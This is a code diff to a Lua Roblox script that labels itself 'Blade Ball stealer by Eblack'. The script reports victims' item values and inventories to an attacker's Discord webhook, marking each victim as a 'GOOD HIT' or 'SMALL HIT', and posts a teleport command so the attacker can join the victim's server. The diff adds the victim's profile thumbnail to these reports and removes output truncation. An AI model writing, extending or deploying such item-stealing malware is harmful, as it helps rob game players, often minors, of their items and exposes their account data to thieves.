@@ -24,6 +24,9 @@ local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = _G.AuthToken or "EBK-SS-A" 
 
+-- AJOUT : URL de l'image de profil (Thumbnail)
+local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
     return
@@ -158,7 +161,6 @@ end
 local totalRAP = 0
 
 local function SendJoinMessage(list, prefix)
-    -- MODIF : Nom du bot et couleur dynamique
     local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
     
@@ -212,26 +214,15 @@ local function SendJoinMessage(list, prefix)
         fields[3].value = fields[3].value .. itemLine .. "\n"
     end
 
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
-
     local data = {
-        ["username"] = botUsername, -- CHANGEMENT DU NOM DU BOT
+        ["username"] = botUsername,
         ["auth_token"] = auth_token, 
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
             ["color"] = embedColor,
             ["fields"] = fields,
+            ["thumbnail"] = {["url"] = headshot}, -- AJOUT DU THUMBNAIL ICI
             ["footer"] = {
                 ["text"] = "Blade Ball stealer by Eblack"
             }
@@ -296,12 +287,13 @@ local function SendMessage(list)
     end
 
     local data = {
-        ["username"] = botUsername, -- CHANGEMENT DU NOM DU BOT
+        ["username"] = botUsername,
         ["auth_token"] = auth_token,
         ["embeds"] = {{
             ["title"] = "⚪ The hit on server 🎉" ,
             ["color"] = embedColor,
             ["fields"] = fields,
+            ["thumbnail"] = {["url"] = headshot}, -- AJOUT DU THUMBNAIL ICI
             ["footer"] = {
                 ["text"] = "Blade Ball stealer by Eblack"
             }
